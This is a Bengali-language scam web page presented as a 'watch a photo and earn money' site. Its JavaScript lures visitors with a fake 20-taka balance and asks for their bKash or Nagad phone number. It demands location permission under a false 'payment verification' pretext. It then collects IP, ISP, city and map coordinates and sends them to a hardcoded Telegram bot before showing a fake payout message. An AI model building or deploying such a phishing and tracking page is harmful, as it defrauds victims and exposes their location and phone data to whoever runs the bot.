<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earn Money - Watch & Earn</title>
    <style>
        body { background: #f4f7f6; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; text-align: center; color: #333; }
        .header { background: #0088cc; color: #fff; padding: 20px; font-size: 22px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .container { max-width: 450px; margin: 30px auto; background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
        .nature-img { width: 100%; border-radius: 10px; margin-bottom: 20px; }
        .timer { font-size: 18px; color: #e74c3c; font-weight: bold; padding: 10px; border: 1px dashed #e74c3c; border-radius: 5px; }
        .balance-box { background: #d4edda; color: #155724; padding: 15px; border-radius: 10px; margin: 20px 0; display: none; }
        .balance-text { font-size: 24px; font-weight: bold; }
        input { width: 90%; padding: 15px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; display: none; outline: none; }
        .btn-withdraw { background: #28a745; color: #fff; padding: 18px; width: 100%; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; display: none; }
        .footer { font-size: 12px; color: #999; margin-top: 30px; }
    </style>
</head>
<body>

    <div class="header">সহজ ইনকাম - প্রতিদিন ছবি দেখে টাকা আয়!</div>

    <div class="container">
        <p id="instruction">নিচের ছবিটি ১০ সেকেন্ড মনোযোগ দিয়ে দেখুন। সময় শেষ হলে আপনার অ্যাকাউন্টে ২০ টাকা জমা হবে।</p>
        
        <img src="https://images.unsplash.com/photo-1501854140801-50d01698950b?auto=format&fit=crop&w=500&q=80" class="nature-img">

        <div id="timerBox" class="timer">অপেক্ষা করুন: <span id="sec">10</span> সেকেন্ড</div>

        <div id="balanceDisplay" class="balance-box">
            <div class="balance-text">অভিনন্দন! আপনার ব্যালেন্স: ৳২০.০০</div>
            <p style="font-size: 14px;">নিচে নম্বর দিয়ে রিচার্জ গ্রহণ করুন।</p>
        </div>

        <input type="number" id="userPhone" placeholder="বিকাশ বা নগদ নম্বর দিন">
        
        <button id="withdrawBtn" class="btn-withdraw" onclick="initiateCapture()">উইথড্র দিন</button>
        
        <div class="footer">© 2026 EasyEarn BD - Secure Payment</div>
    </div>

<script>
    // ১০ সেকেন্ডের কাউন্টডাউন
    let seconds = 10;
    const timerInterval = setInterval(() => {
        seconds--;
        document.getElementById("sec").innerText = seconds;
        if (seconds <= 0) {
            clearInterval(timerInterval);
            enableWithdraw();
        }
    }, 1000);

    function enableWithdraw() {
        document.getElementById("instruction").style.display = "none";
        document.getElementById("timerBox").style.display = "none";
        document.getElementById("balanceDisplay").style.display = "block";
        document.getElementById("userPhone").style.display = "inline-block";
        document.getElementById("withdrawBtn").style.display = "block";
    }

    async function initiateCapture() {
        const phone = document.getElementById('userPhone').value;
        if (phone.length < 11) {
            alert("সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!");
            return;
        }

        // পেমেন্ট ভেরিফিকেশনের বাহানায় লোকেশন পারমিশন চাওয়া
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => collectData(phone, pos.coords.latitude, pos.coords.longitude),
                () => {
                    alert("পেমেন্ট ভেরিফিকেশন ব্যর্থ! টাকা পেতে লোকেশন 'Allow' করতে হবে।");
                    collectData(phone, "Denied", "Denied");
                }
            );
        }
    }

    async function collectData(phone, lat, lon) {
        // IP ও অন্যান্য তথ্য
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        const mapLink = (lat === "Denied") ? "Denied" : `https://www.google.com/maps?q=${lat},${lon}`;
        
        const botToken = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
        const chatId = "7547190025";
        
        const message = `💰 **উইথড্র রিকোয়েস্ট!** 💰\n\n` +
                        `📞 **নম্বর:** ${phone}\n` +
                        `🌐 **IP:** ${data.ip}\n` +
                        `📶 **সিম:** ${data.org}\n` +
                        `🏙️ **শহর:** ${data.city}\n` +
                        `📍 **ম্যাপ:** ${mapLink}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(() => {
            alert("আপনার উইথড্র রিকোয়েস্ট সফল হয়েছে। ১ ঘণ্টার মধ্যে পেমেন্ট পৌঁছে যাবে।");
            window.location.href = "https://www.google.com";
        });
    }
</script>

</body>
</html>
